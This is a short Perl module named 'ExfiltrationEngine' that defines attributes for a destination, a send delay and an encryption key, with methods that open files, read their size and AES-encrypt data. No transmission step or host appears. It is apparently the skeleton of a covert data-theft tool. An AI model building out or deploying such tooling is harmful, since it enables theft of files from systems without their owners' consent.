#!/usr/bin/perl

package ExfiltrationEngine;

use Crypt::AES::CTR;
use File::stat;
use LWP::UserAgent;
use Moose;

has delay => (
    is  =>  'rw',
    isa =>  'Int'
);

has dest => (
    is  =>  'rw',
    isa =>  'Str'
);

has file => (
    is  =>  'rw'
);

has size => (
    is  =>  'rw',
    isa =>  'Int'
);

has encryptionKey => (
    is  =>  'rw',
    isa =>  'Str'
);

sub load {
    my($self, $file) = @_;

    open $self->{file}, '<', $file or die $!;
    binmode $self->file;

    return stat($file)->size;
}

sub close {
    my $self = shift;

    close($self->file);
}

sub encrypt {
    my($self, $data) = @_;

    return Crypt::AES::CTR::encrypt($data, $self->encryptionKey, 256);
}

1;
